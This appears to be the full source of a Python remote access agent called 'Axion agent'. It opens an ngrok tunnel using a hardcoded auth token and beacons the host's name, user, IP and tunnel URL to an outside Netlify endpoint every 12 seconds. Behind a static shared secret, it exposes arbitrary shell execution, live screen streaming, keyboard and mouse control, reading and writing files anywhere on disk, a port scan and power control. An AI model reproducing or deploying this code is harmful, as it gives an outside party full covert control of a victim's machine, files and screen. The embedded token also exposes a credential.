# Axion agent — keep this window open
# python agent.py

import os
import sys
import time
import json
import io
import hashlib
import socket
import threading
import subprocess
import platform
import shutil
import zipfile
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs, unquote
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

PORT = 8765
SECRET = "axion-remote-2026"
BEACON_URL = "https://truededsec.netlify.app/api/beacon"
NGROK_TOKEN = "3JatZTgwEJ7ociC1DnwNJjAVtfF_6zXCg5XWXEKy3wR2Xb3sG"
MAX_UPLOAD = 80 * 1024 * 1024

OS_NAME = platform.system()
HOSTNAME = socket.gethostname()
USER = os.getenv("USERNAME") or os.getenv("USER") or "?"
MACHINE_ID = hashlib.sha1((HOSTNAME + "|" + USER).encode()).hexdigest()[:8]
ROOT = os.path.dirname(os.path.abspath(sys.argv[0] if getattr(sys, "frozen", False) else __file__))
TOOLS = os.path.join(ROOT, "tools")
HOME = os.path.expanduser("~")

public_url = None
screen_w, screen_h = 1920, 1080
latest_jpeg = None
latest_lock = threading.Lock()
stream_fps = 0
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 4040, 5432, 5900, 6080, 6379, 7681, 8000, 8080, 8443, 8765, 9090]


def log(*a):
    print(time.strftime("[%H:%M:%S]"), *a, flush=True)


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def pip_install(*pkgs):
    subprocess.run([sys.executable, "-m", "pip", "install", *pkgs], timeout=180)


def ensure_deps():
    need = []
    try:
        import PIL  # noqa: F401
    except Exception:
        need.append("pillow")
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.PAUSE = 0
    except Exception:
        need.append("pyautogui")
    try:
        import mss  # noqa: F401
    except Exception:
        need.append("mss")
    if need:
        log("installing", need)
        pip_install(*need)


def ensure_ngrok():
    os.makedirs(TOOLS, exist_ok=True)
    name = "ngrok.exe" if OS_NAME == "Windows" else "ngrok"
    path = os.path.join(TOOLS, name)
    found = shutil.which("ngrok")
    if found:
        return found
    if os.path.exists(path):
        return path
    if OS_NAME == "Windows":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    elif OS_NAME == "Darwin":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
    else:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
    zpath = os.path.join(TOOLS, "ngrok.zip")
    log("downloading ngrok")
    req = Request(url, headers={"User-Agent": "axion-agent"})
    with urlopen(req, timeout=90) as r, open(zpath, "wb") as f:
        f.write(r.read())
    with zipfile.ZipFile(zpath, "r") as z:
        z.extractall(TOOLS)
    if OS_NAME != "Windows":
        os.chmod(path, 0o755)
    return path


def start_ngrok(ngrok):
    global public_url
    try:
        subprocess.run([ngrok, "config", "add-authtoken", NGROK_TOKEN], capture_output=True, text=True, timeout=20)
    except Exception as e:
        log("ngrok auth fail", e)
    subprocess.Popen([ngrok, "http", str(PORT), "--log=stdout"])
    for i in range(40):
        time.sleep(1)
        try:
            with urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
                data = json.loads(r.read().decode())
            for t in data.get("tunnels") or []:
                addr = (t.get("public_url") or "").rstrip("/")
                if addr.startswith("https://"):
                    public_url = addr
                    log("PUBLIC URL", public_url)
                    return public_url
        except Exception as e:
            log("ngrok wait", e)
    log("NO PUBLIC URL")
    return None


def encode_frame(img):
    global screen_w, screen_h
    screen_w, screen_h = img.size
    img = img.convert("RGB")
    img.thumbnail((1600, 900))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=50, optimize=False)
    return buf.getvalue()


def capture_loop():
    global latest_jpeg, stream_fps
    log("capture loop start (target 60fps)")
    sct = None
    try:
        import mss
        sct = mss.mss()
        mon = sct.monitors[1]
    except Exception as e:
        log("mss not used:", e)
    frames = 0
    t0 = time.time()
    while True:
        t_start = time.time()
        try:
            if sct is not None:
                from PIL import Image
                raw = sct.grab(mon)
                img = Image.frombytes("RGB", raw.size, raw.rgb)
            else:
                from PIL import ImageGrab
                img = ImageGrab.grab()
            jpeg = encode_frame(img)
            with latest_lock:
                latest_jpeg = jpeg
            frames += 1
            now = time.time()
            if now - t0 >= 1:
                stream_fps = frames
                frames = 0
                t0 = now
        except Exception as e:
            log("capture", e)
            time.sleep(0.05)
        dt = time.time() - t_start
        wait = (1.0 / 60.0) - dt
        if wait > 0:
            time.sleep(wait)


def get_jpeg():
    with latest_lock:
        return latest_jpeg


def mouse_click(x, y, button="left"):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(int(x), int(y))
        if button == "right":
            pyautogui.rightClick()
        elif button == "move":
            pass
        else:
            pyautogui.click()
        return True
    except Exception as e:
        log("mouse", e)
        return False


def type_text(text):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.write(text, interval=0.01)
        return True
    except Exception as e:
        log("type", e)
        return False


def press_key(key):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.press(key)
        return True
    except Exception as e:
        log("key", e)
        return False


def run_shell(cmd):
    if not str(cmd).strip():
        return {"error": "empty"}
    try:
        proc = ["powershell", "-NoProfile", "-Command", cmd] if OS_NAME == "Windows" else ["/bin/bash", "-lc", cmd]
        r = subprocess.run(proc, capture_output=True, text=True, timeout=25)
        return {"ok": True, "os": OS_NAME, "stdout": (r.stdout or "")[-8000:], "stderr": (r.stderr or "")[-2000:], "code": r.returncode}
    except Exception as e:
        return {"ok": False, "error": str(e), "os": OS_NAME}


def power_action(action):
    action = (action or "").lower().strip()
    log("POWER", action)
    try:
        if OS_NAME == "Windows":
            m = {"shutdown": ["shutdown", "/s", "/t", "0"], "restart": ["shutdown", "/r", "/t", "0"], "sleep": ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"]}
        elif OS_NAME == "Darwin":
            m = {
                "shutdown": ["osascript", "-e", 'tell app "System Events" to shut down'],
                "restart": ["osascript", "-e", 'tell app "System Events" to restart'],
                "sleep": ["pmset", "sleepnow"],
            }
        else:
            m = {"shutdown": ["systemctl", "poweroff"], "restart": ["systemctl", "reboot"], "sleep": ["systemctl", "suspend"]}
        if action not in m:
            return {"ok": False, "error": "unknown action"}
        subprocess.Popen(m[action])
        return {"ok": True, "action": action, "os": OS_NAME}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def scan_ports():
    open_ports = []

    def check(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        try:
            if s.connect_ex(("127.0.0.1", p)) == 0:
                open_ports.append(p)
        except Exception:
            pass
        finally:
            s.close()

    ts = [threading.Thread(target=check, args=(p,)) for p in SCAN_PORTS]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return sorted(open_ports)


def safe_path(p):
    if not p:
        return HOME
    p = os.path.abspath(p)
    return p


def list_dir(path):
    path = safe_path(path)
    if not os.path.isdir(path):
        return {"ok": False, "error": "not a directory", "path": path}
    items = []
    try:
        names = os.listdir(path)
    except Exception as e:
        return {"ok": False, "error": str(e), "path": path}
    names = names[:800]
    for name in names:
        full = os.path.join(path, name)
        try:
            st = os.stat(full)
            items.append({
                "name": name,
                "path": full,
                "dir": os.path.isdir(full),
                "size": int(st.st_size),
                "mtime": int(st.st_mtime),
            })
        except Exception:
            continue
    items.sort(key=lambda x: (not x["dir"], x["name"].lower()))
    parent = os.path.dirname(path)
    drives = []
    if OS_NAME == "Windows":
        for c in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            d = c + ":\\"
            if os.path.exists(d):
                drives.append(d)
    return {"ok": True, "path": path, "parent": parent, "home": HOME, "drives": drives, "items": items}


def phone_home_once():
    payload = {
        "id": MACHINE_ID,
        "hostname": HOSTNAME,
        "local_ip": get_local_ip(),
        "public_url": public_url or "",
        "api_url": public_url or "",
        "term_url": public_url or "",
        "vnc_url": public_url or "",
        "user": USER,
        "os": OS_NAME,
        "ts": datetime.now(timezone.utc).isoformat(),
        "secret": SECRET,
    }
    req = Request(BEACON_URL, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=15) as r:
            log("beacon", r.status, r.read().decode())
            return True
    except HTTPError as e:
        log("beacon HTTP", e.code, e.read().decode(errors="replace"))
    except URLError as e:
        log("beacon net", e.reason)
    except Exception as e:
        log("beacon fail", e)
    return False


def phone_loop():
    while True:
        phone_home_once()
        time.sleep(12)


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Secret, ngrok-skip-browser-warning")

    def _auth(self):
        if self.headers.get("X-Secret", "") == SECRET:
            return True
        q = parse_qs(urlparse(self.path).query)
        return (q.get("k") or [""])[0] == SECRET

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def _json(self, obj, code=200):
        raw = json.dumps(obj).encode()
        self.send_response(code)
        self._cors()
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        u = urlparse(self.path)
        path = u.path
        q = parse_qs(u.query)
        if path == "/ping":
            self._json({"ok": True, "id": MACHINE_ID, "os": OS_NAME, "public": public_url, "w": screen_w, "h": screen_h, "fps": stream_fps})
            return
        if not self._auth():
            self._json({"error": "forbidden"}, 403)
            return
        if path in ("/stream", "/stream.mjpeg"):
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-cache, no-store")
            self.send_header("Pragma", "no-cache")
            self.end_headers()
            try:
                last = None
                while True:
                    jpeg = get_jpeg()
                    if jpeg and jpeg is not last:
                        last = jpeg
                        chunk = (
                            b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: "
                            + str(len(jpeg)).encode()
                            + b"\r\n\r\n"
                            + jpeg
                            + b"\r\n"
                        )
                        self.wfile.write(chunk)
                        self.wfile.flush()
                    time.sleep(1.0 / 60.0)
            except Exception:
                return
        if path == "/screen":
            jpeg = get_jpeg()
            import base64
            self._json({
                "img": base64.b64encode(jpeg).decode() if jpeg else None,
                "w": screen_w,
                "h": screen_h,
                "fps": stream_fps,
            })
            return
        if path in ("/ports", "/scan"):
            self._json({"ok": True, "host": "127.0.0.1", "os": OS_NAME, "open": scan_ports()})
            return
        if path == "/info":
            self._json({"id": MACHINE_ID, "os": OS_NAME, "hostname": HOSTNAME, "user": USER, "local_ip": get_local_ip(), "public_url": public_url, "fps": stream_fps})
            return
        if path == "/fs":
            self._json(list_dir(unquote((q.get("path") or [HOME])[0])))
            return
        if path == "/download":
            fp = safe_path(unquote((q.get("path") or [""])[0]))
            if not os.path.isfile(fp):
                self._json({"error": "not a file"}, 404)
                return
            try:
                size = os.path.getsize(fp)
                self.send_response(200)
                self._cors()
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", 'attachment; filename="%s"' % os.path.basename(fp).replace('"', ""))
                self.send_header("Content-Length", str(size))
                self.end_headers()
                with open(fp, "rb") as f:
                    shutil.copyfileobj(f, self.wfile, 1024 * 256)
            except Exception as e:
                log("download", e)
            return
        self._json({"error": "not found"}, 404)

    def do_POST(self):
        if not self._auth():
            self._json({"error": "forbidden"}, 403)
            return
        u = urlparse(self.path)
        path = u.path
        q = parse_qs(u.query)
        n = int(self.headers.get("Content-Length", 0) or 0)
        if path == "/upload":
            if n > MAX_UPLOAD:
                self._json({"error": "file too large"}, 413)
                return
            directory = safe_path(unquote((q.get("path") or [HOME])[0]))
            name = os.path.basename(unquote((q.get("name") or ["upload.bin"])[0]))
            if not name:
                name = "upload.bin"
            os.makedirs(directory, exist_ok=True)
            dest = os.path.join(directory, name)
            left = n
            try:
                with open(dest, "wb") as f:
                    while left > 0:
                        chunk = self.rfile.read(min(65536, left))
                        if not chunk:
                            break
                        f.write(chunk)
                        left -= len(chunk)
                self._json({"ok": True, "path": dest, "size": os.path.getsize(dest)})
            except Exception as e:
                self._json({"ok": False, "error": str(e)}, 500)
            return
        raw = self.rfile.read(n).decode() if n else "{}"
        try:
            data = json.loads(raw)
        except Exception:
            data = {}
        if path == "/mouse":
            self._json({"ok": mouse_click(data.get("x", 0), data.get("y", 0), data.get("button", "left"))})
        elif path == "/keyboard":
            ok = type_text(data["text"]) if data.get("text") else press_key(data.get("key", ""))
            self._json({"ok": ok})
        elif path in ("/shell", "/powershell"):
            self._json(run_shell(data.get("cmd", "")))
        elif path == "/power":
            self._json(power_action(data.get("action", "")))
        else:
            self._json({"error": "not found"}, 404)

    def log_message(self, fmt, *args):
        log("http", fmt % args)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main():
    print("=" * 56)
    print("AXION AGENT — window stays open")
    print("os", OS_NAME, "| host", HOSTNAME, "| user", USER)
    print("=" * 56)
    ensure_deps()
    threading.Thread(target=capture_loop, daemon=True).start()
    srv = ThreadedHTTPServer(("0.0.0.0", PORT), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log("api http://127.0.0.1:%s" % PORT)
    try:
        ng = ensure_ngrok()
        start_ngrok(ng)
    except Exception as e:
        log("ngrok fatal", e)
    if phone_home_once():
        log("OPEN https://truededsec.netlify.app/  password 0000")
    threading.Thread(target=phone_loop, daemon=True).start()
    log("running. close this window to stop.")
    try:
        while True:
            time.sleep(20)
            log("alive", public_url or "(no url)", "fps", stream_fps)
    except KeyboardInterrupt:
        log("stopped")


if __name__ == "__main__":
    main()
